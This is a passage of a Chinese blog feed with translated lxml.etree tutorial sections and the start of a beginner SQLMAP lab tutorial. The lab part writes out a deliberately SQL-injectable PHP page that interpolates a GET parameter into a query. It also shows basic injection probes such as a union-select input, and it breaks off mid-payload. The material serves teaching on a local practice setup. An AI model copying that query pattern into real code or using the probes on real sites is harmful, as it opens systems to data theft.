class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br = etree.SubElement(body, &quot;br&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; br.tail = &quot;TAIL&quot;</span><br><span class="line">&gt;&gt;&gt; etree.tostring(html)</span><br><span class="line">b&apos;&lt;html&gt;&lt;body&gt;TEXT&lt;br/&gt;TAIL&lt;/body&gt;&lt;/html&gt;&apos;</span><br></pre></td></tr></table></figure><p><code>.text</code> 和 <code>.tail</code> 两个属性足以在XML文档中表示所有文本内容。这样一来，ElementTree API 就不需要除了 Element 类之外的任何<strong>特殊文本节点</strong>，通常来说这些<strong>特殊节点</strong>是很碍事的（从<strong>DOM</strong> API中也能窥知一二）。</p><p>然而，tail 文本也有它不方便的地方。比如，当你从树中序列化（serialise）一个元素的时候，你可能并不会希望tail里的文本紧随其后（当然你可能会需要它子元素的tail属性里的文本）。为了达到这个目的，<strong>tostring()</strong>方法可以接收一个关键字参数：<em>with_tail</em> (是bool类型)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(br)</span><br><span class="line">b&apos;&lt;br/&gt;TAIL&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(br, with_tail=False)#lxml.etree only!</span><br><span class="line">b&apos;&lt;br/&gt;&apos;</span><br></pre></td></tr></table></figure><p>如果你仅仅需要一个XML文档中的所有TEXT（而不需要标签），你可以递归的地拼接所有text和tail属性。再一次的，<strong>tostring()</strong> 方法提供了 <em>method</em> 关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; etree.tostring(html, method=&quot;text&quot;)</span><br><span class="line">b&apos;TEXTTAIL&apos;</span><br></pre></td></tr></table></figure><h2 id="使用-XPath-查找文本"><a href="#使用-XPath-查找文本" class="headerlink" title="使用 XPath 查找文本"></a>使用 XPath 查找文本</h2><p>另一种在树中提取出文本内容的方式是使用 <strong>XPath</strong> ，它甚至可以帮你将连在一起的文本块（text chunks）分开，并存到一个list里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;string()&quot;)) # lxml.etree only!</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(html.xpath(&quot;//text()&quot;)) # lxml.etree only!</span><br><span class="line">[&apos;TEXT&apos;, &apos;TAIL&apos;]</span><br></pre></td></tr></table></figure><p>如果你想经常使用的话，可以将其打包成函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; generate_text_list = etree.XPath(&quot;//text()&quot;) # lxml.etree only!</span><br><span class="line">&gt;&gt;&gt; print generate_text_list(html)</span><br></pre></td></tr></table></figure><p>需要注意，使用XPath返回的字符串结果都是”智能”的对象，他们可以知道自己是属于哪个元素的文本，即知道自己的父亲（源头），通过<strong>getparent()</strong>方法。就像你对 Element 对象操作的那样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; texts = generate_text_list(html)</span><br><span class="line">&gt;&gt;&gt; print(texts[0])</span><br><span class="line">TEXT</span><br><span class="line">&gt;&gt;&gt; parent = texts[0].getparent();;注意这是对一个&quot;字符串&quot;进行的操作哦</span><br><span class="line">&gt;&gt;&gt; print(parent.tag)</span><br><span class="line">body</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(texts[1])</span><br><span class="line">TAIL</span><br><span class="line">&gt;&gt;&gt; print(texts[1].getparent().tag)</span><br><span class="line">br</span><br></pre></td></tr></table></figure><p>你也可以通过 <code>is_text</code> 和 <code>is_tail</code> 来判断其是text还是tail</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(texts[0].is_text)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_text)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; print(texts[1].is_tail)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>不过虽然这适用于text()函数的结果，但 lxml 是无法告诉您由XPath函数的string()或concat()构造的字符串值的起源（父亲）的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; stringify = etree.XPath(&quot;string()&quot;)</span><br><span class="line">&gt;&gt;&gt; print(stringify(html))</span><br><span class="line">TEXTTAIL</span><br><span class="line">&gt;&gt;&gt; print(stringify(html).getparent())</span><br><span class="line">None</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;元素包含文本&lt;/li&gt;
&lt;li&gt;使用 XPath 查找文本&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part one</title>
    <link href="https://pwn4justice.github.io/2019/06/22/lxml-etree-tutorial-part-one/"/>
    <id>https://pwn4justice.github.io/2019/06/22/lxml-etree-tutorial-part-one/</id>
    <published>2019-06-22T07:50:17.000Z</published>
    <updated>2019-07-08T14:43:53.085Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文目录：</p><ol><li>元素（Element）类</li><li>元素即列表</li><li>元素像字典（dict）那样展现属性</li></ol><a id="more"></a><p><strong>内容：</strong></p><ul><li>Element 类<ul><li>元素集合与列表（list）形式的兼容</li><li>元素像字典（dict）那样展现属性</li><li>元素中包含文本</li><li>使用 XPath 查找文本</li><li>树的迭代</li><li>序列化</li></ul></li><li>ElementTree 类</li><li>从字符串或文件中解析数据<ul><li>fromstring() 方法</li><li>XML() 方法</li><li>解析器对象</li><li>递增解析</li><li>事件驱动的解析</li></ul></li><li>命名空间</li><li>E-factory</li><li>ElementPath （元素路径）</li></ul><p>一个常用的导入 lxml.etree 的方式：<code>from lxml import etree</code></p><p>如果你的代码只使用到了 ElementTree API 的功能而没有用到 lxml.tree 中的任何特有功能，那么你可以使用下面的方法导入 ElementTree 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">  from lxml import etree</span><br><span class="line">  print(&quot;running with lxml.etree&quot;)</span><br><span class="line">except ImportError:</span><br><span class="line">  try:</span><br><span class="line">    # Python 2.5</span><br><span class="line">    import xml.etree.cElementTree as etree</span><br><span class="line">    print(&quot;running with cElementTree on Python 2.5+&quot;)</span><br><span class="line">  except ImportError:</span><br><span class="line">    try:</span><br><span class="line">      # Python 2.5</span><br><span class="line">      import xml.etree.ElementTree as etree</span><br><span class="line">      print(&quot;running with ElementTree on Python 2.5+&quot;)</span><br><span class="line">    except ImportError:</span><br><span class="line">      try:</span><br><span class="line">        # normal cElementTree install</span><br><span class="line">        import cElementTree as etree</span><br><span class="line">        print(&quot;running with cElementTree&quot;)</span><br><span class="line">      except ImportError:</span><br><span class="line">        try:</span><br><span class="line">          # normal ElementTree install</span><br><span class="line">          import elementtree.ElementTree as etree</span><br><span class="line">          print(&quot;running with ElementTree&quot;)</span><br><span class="line">        except ImportError:</span><br><span class="line">          print(&quot;Failed to import ElementTree from any known place&quot;)</span><br></pre></td></tr></table></figure><h3 id="Element-类"><a href="#Element-类" class="headerlink" title="Element 类"></a>Element 类</h3><p> <code>Element</code> 类是 ElementAPI 的主要容器对象，大多数 XML 树功能都可以通过这个类访问。通过<code>Element()</code>可以很容易创建元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&apos;root_tag&apos;)</span><br></pre></td></tr></table></figure><p>使用 tag 属性访问XML的标签名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print root.tag</span><br><span class="line">root_tag</span><br></pre></td></tr></table></figure><p>元素是用XML树结构组织的，你可以使用 <code>append()</code> 方法来创建一个子元素并添加到父元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root.append( etree.Element(&apos;child1_tag&apos;) )</span><br></pre></td></tr></table></figure><p>然而还有一个更高效的方法来做上面这件事，即使用 <code>SubElement</code> 工厂（此处工厂：factory，意指某个类的初始化方法），但是，该方法需要将“父元素”变量作为它的第一个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child2 = etree.SubElement(root, &quot;child2_tag&quot;)</span><br><span class="line">&gt;&gt;&gt; child3 = etree.SubElement(root, &quot;child3_tag&quot;)</span><br></pre></td></tr></table></figure><p>可以通过如下步骤序列化你创建的这棵树，来看见真正的XML效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.tostring(root, pretty_print=True))</span><br><span class="line">&lt;root_tag&gt;</span><br><span class="line">  &lt;child1_tag/&gt;</span><br><span class="line">  &lt;child2_tag/&gt;</span><br><span class="line">  &lt;child3_tag/&gt;</span><br><span class="line">&lt;/root_tag&gt;</span><br></pre></td></tr></table></figure><h3 id="元素即列表"><a href="#元素即列表" class="headerlink" title="元素即列表"></a>元素即列表</h3><p>为了更简单和直观的访问子元素，该模块尽可能地模仿了 Python 的 list 的行为，每个元素都像是一个列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; child = root[0]</span><br><span class="line">&gt;&gt;&gt; print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(len(root))</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.index(root[1]) # lxml.etree only!</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; children = list(root)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for child in root:</span><br><span class="line">...     print(child.tag)</span><br><span class="line">child1_tag</span><br><span class="line">child2_tag</span><br><span class="line">child3_tag</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; root.insert(0, etree.Element(&quot;child0_tag&quot;))</span><br><span class="line">&gt;&gt;&gt; start = root[:1]//该方法返回列表,尽管列表中只有一个元素!</span><br><span class="line">&gt;&gt;&gt; end   = root[-1:]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(start[0].tag)</span><br><span class="line">child0_tag</span><br><span class="line">&gt;&gt;&gt; print(end[0].tag)</span><br><span class="line">child3_tag</span><br></pre></td></tr></table></figure><p>在 ElementTree 1.3 和 lxml 2.0 之前，你可以通过如下方式查看某个元素是否有子节点，如果有，则为真：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if root:</span><br><span class="line">print &quot;有子节点&quot;</span><br></pre></td></tr></table></figure><p>不过这种方式不支持在未来使用了，应当改用 <code>len(element)</code> 这种方式，才会更少出错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(etree.iselement(root))  # 测试是否是 Element</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; if len(root):                 # 测试是否有孩子</span><br><span class="line">...     print(&quot;The root element has children&quot;)</span><br><span class="line">The root element has children</span><br></pre></td></tr></table></figure><p>在 lxml(2.0+) 版本中，Element 的一个特殊的行为表现的和原始的 ElementTree（1.3- 或者 Python 2.7/3.2中）或者 list 不同，即赋值操作 <code>root[0] = root[-1]</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child0 at 0x102c0c368&gt;</span><br><span class="line">child0</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;</span><br><span class="line">child3</span><br><span class="line">&gt;&gt;&gt; root[0] = root[-1]</span><br><span class="line">&gt;&gt;&gt; for c in root:</span><br><span class="line">...     print c</span><br><span class="line">...     print c.tag</span><br><span class="line">... </span><br><span class="line">&lt;Element child3 at 0x102c0ce60&gt;//注意此处的地址</span><br><span class="line">child3</span><br><span class="line">&lt;Element child1 at 0x102c0ce18&gt;</span><br><span class="line">child1</span><br><span class="line">&lt;Element child2 at 0x102c0cea8&gt;</span><br><span class="line">child2</span><br></pre></td></tr></table></figure><p>而在 list 中的行为是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; l = [0, 1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; l[0] = l[-1]</span><br><span class="line">&gt;&gt;&gt; l</span><br><span class="line">[3, 1, 2, 3]//复制，而不是直接移动</span><br></pre></td></tr></table></figure><p>在早期的 ElementTree 中，Element 对象有着和 list 一样的表现，但是有个缺点就是：当你这样做之后，修改其中一个拥有多份拷贝的 Element 时，其余的也会被修改。</p><p>这个小小的不同有一个好处，就是：用 lxml.tree 创建的 Element 总是只有一个父亲，可以用 <code>getparent()</code> 得到，且这在 ElementTree 中是不被支持的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root is root[0].getparent()  # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>那当你只想拷贝时怎么办？凉拌。先用 etree.Element() 创建一个全新的对象，再用Python自带的 copy 模块来复制 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from copy import deepcopy</span><br><span class="line">&gt;&gt;&gt; element = etree.Element(&quot;temproray_store_tags&quot;)</span><br><span class="line">&gt;&gt;&gt; element = append( deepcopy(root[1]) )</span><br><span class="line">&gt;&gt;&gt; print(element[0].tag)</span><br><span class="line">child1_tag</span><br><span class="line">&gt;&gt;&gt; print([ c.tag for c in root ])</span><br><span class="line">[&apos;child3_tag&apos;, &apos;child1_tag&apos;, &apos;child2_tag&apos;]</span><br></pre></td></tr></table></figure><p>兄弟节点可以用 <code>getprevious()</code> 或者 <code>getnext()</code> 反问到：只有在使用 lxml.etree 创建的元素上有效!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root[0] is root[1].getprevious() # lxml.etree only!</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; root[1] is root[0].getnext() # lxml.etree only!</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="元素像字典（dict）那样展现属性"><a href="#元素像字典（dict）那样展现属性" class="headerlink" title="元素像字典（dict）那样展现属性"></a>元素像字典（dict）那样展现属性</h3><p>XML 元素支持属性，可以在Element工厂中直接创建属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; root = etree.Element(&quot;root_tag&quot;, interesting=&quot;totally&quot;)</span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot;/&gt;&apos;</span><br></pre></td></tr></table></figure><p>属性只是无序的键值对，所以可以使用类字典的接口来访问他们：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(root.get(&quot;interesting&quot;))</span><br><span class="line">totally</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">None</span><br><span class="line">&gt;&gt;&gt; root.set(&quot;href&quot;, &quot;www.baidu.com&quot;)</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;href&quot;))</span><br><span class="line">www.baidu.com</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; etree.tostring(root)</span><br><span class="line">b&apos;&lt;root interesting=&quot;totally&quot; href=&quot;www.baidu.com&quot;/&gt;&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; sorted(root.keys())</span><br><span class="line">[&apos;href&apos;, &apos;interesting&apos;]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; for name, value in sorted(root.items()):</span><br><span class="line">...     print(&apos;%s = %r&apos; % (name, value))</span><br><span class="line">href = &apos;www.baidu.com&apos;</span><br><span class="line">interesting = &apos;totally&apos;</span><br></pre></td></tr></table></figure><p>如果你想使用类字典的形式来访问属性的话，可以使用 Element 的 <code>attrib</code> 属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; attributes = root.attrib//type(attributes) == &lt;type &apos;lxml.etree._Attrib&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;interesting&quot;])</span><br><span class="line">totally</span><br><span class="line">&gt;&gt;&gt; print(attributes.get(&quot;src&quot;))</span><br><span class="line">None</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; attributes[&quot;src&quot;] = &quot;source_src&quot;</span><br><span class="line">&gt;&gt;&gt; print(attributes[&quot;src&quot;])</span><br><span class="line">source_src</span><br><span class="line">&gt;&gt;&gt; print(root.get(&quot;src&quot;))</span><br><span class="line">source_src</span><br></pre></td></tr></table></figure><p>注意：attrib 是一个类字典(不是真正的 dict 对象)的对象，这意味着对 Element 的所有改变都会被反应到 attrib 对象上，反之亦然。同时，只要有一个 Element 的 attrib 属性在使用中，那么XML树就会一直存在于内存。不过可以使用一个真正的 dict 对象来保存某个 attrib 对象的一份快照，这是不依赖于XML树的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = dict(root.attrib)</span><br><span class="line">&gt;&gt;&gt; sorted(d.items())</span><br><span class="line">[(&apos;href&apos;, &apos;www.baidu.com&apos;), (&apos;interesting&apos;, &apos;totally&apos;)]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文目录：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;元素（Element）类&lt;/li&gt;
&lt;li&gt;元素即列表&lt;/li&gt;
&lt;li&gt;元素像字典（dict）那样展现属性&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLMAP 新手教程（一）</title>
    <link href="https://pwn4justice.github.io/2019/06/11/SQLMAP-%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/</id>
    <published>2019-06-11T15:06:58.000Z</published>
    <updated>2019-07-19T16:20:04.534Z</updated>
    
    <content type="html"><![CDATA[<p>前言：现在的网络安全措施日益健全，尤其是针对像 SQL 注入这样的常见漏洞也变得越来越不常见，或者难以利用，对新手体验/学习都不是很好；而且网络安全法也日益完善，所以目前来说，我认为使用 DVWA 或者 pikachu 这样的平台来熟悉 OWASP TOP 10 以及相关安全工具的应用，是必要且稳妥的。</p><p>本文主要介绍一些 SQLMAP 的简单应用，由于暂时只是测试低级别的 SQL 注入，所以可以自己写一个有 SQL 注入的页面来进行测试，本文就是基于此的。</p><a id="more"></a><h2 id="0x00-环境介绍"><a href="#0x00-环境介绍" class="headerlink" title="0x00 环境介绍"></a>0x00 环境介绍</h2><ul><li>操作系统：Windows 10</li><li>软件：phpStudy v5.2 珍藏版、SQLMAP</li></ul><h2 id="0x01-SQL-注入漏洞页面编写"><a href="#0x01-SQL-注入漏洞页面编写" class="headerlink" title="0x01 SQL 注入漏洞页面编写"></a>0x01 SQL 注入漏洞页面编写</h2><p>在 <code>D:\phpStudy5.2\WWW\</code> 默认的网站根目录下（或者自己新建一个diy目录，记得访问时加上即可），编写以下两个文件：</p><blockquote><p>conn.php            //数据库连接页面</p><p>sqli.php                //漏洞页面</p></blockquote><p><strong>conn.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$server = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"your_account"</span>;</span><br><span class="line">$password = <span class="string">"your_password"</span>;</span><br><span class="line">$db = <span class="string">"dvwa"</span>;&lt;!-- 这里采取 dvwa 数据库测试，安装 DVWA 是不必要的，只是不想自己建库/表.. --&gt;</span><br><span class="line"><span class="comment">//create a connection</span></span><br><span class="line">$conn = mysqli_connect($server, $username, $password, $db);</span><br><span class="line"></span><br><span class="line"><span class="comment">//test</span></span><br><span class="line"><span class="keyword">if</span> (!$conn)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connect failed! in conn.php, Info: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo "Success.";</span></span><br></pre></td></tr></table></figure><p><strong>sqli.php：</strong>这是一个超级简陋的存在 sql 注入的页面，相当于 DVWA 的 LOW 级别吧… :joy:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Test Sql-injection&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="comment"># method="GET"&gt;</span></span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) )&#123;</span><br><span class="line">$id = $_GET[<span class="string">"id"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//query from db</span></span><br><span class="line">$query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">$result = mysqli_query($conn, $query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( mysqli_num_rows($result) &gt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="comment">//Get the data</span></span><br><span class="line"><span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"first name: "</span> . $row[<span class="string">"first_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"last name : "</span> . $row[<span class="string">"last_name"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- 此页面来熟悉 SQLMAP 的使用基本上没有什么阻碍 --&gt;</span><br></pre></td></tr></table></figure><p><strong>正常访问页面</strong></p><p><img src="ok.png" alt="ok"></p><br><p><strong>出错情况</strong></p><p>使用 <code>1&#39; and 1=1 --</code></p><p><img src="ok2.png" alt="ok2"></p><p><br>使用 <code>1&#39; and 1=2 --</code></p><p><img src="err.png" alt="err"></p><p><br>使用 <code>1&#39; union select 1 --</code></p><p><img src="err2.png" alt="err2"></p><p><br>使用 <code>1&#39; union select 